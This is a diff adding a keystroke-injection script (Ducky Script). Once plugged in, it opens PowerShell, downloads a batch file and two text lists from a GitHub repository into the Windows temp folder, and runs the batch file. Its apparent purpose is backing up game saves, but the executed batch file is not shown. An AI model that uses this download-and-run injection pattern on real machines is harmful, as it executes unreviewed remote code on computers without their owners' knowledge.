@@ -1,0 +1,26 @@
+DELAY 5000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 400
+ENTER
+DELAY 700
+STRING Invoke-WebRequest https://raw.githubusercontent.com/getsmor/Savegames/main/backup.bat -OutFile C:\Windows\Temp\backup.bat
+DELAY 500
+SHIFT ENTER
+DELAY 250
+STRING Invoke-WebRequest https://raw.githubusercontent.com/getsmor/Savegames/main/gamelocations.txt -OutFile C:\Windows\Temp\gamelocations.txt
+DELAY 500
+SHIFT ENTER
+DELAY 250
+STRING Invoke-WebRequest https://raw.githubusercontent.com/getsmor/Savegames/main/gamenames.txt -OutFile C:\Windows\Temp\gamenames.txt
+DELAY 500
+SHIFT ENTER
+DELAY 500
+STRING start-process C:\Windows\Temp\backup.bat
+DELAY 250
+SHIFT ENTER
+DELAY 250
+STRING exit
+DELAY 250
+ENTER
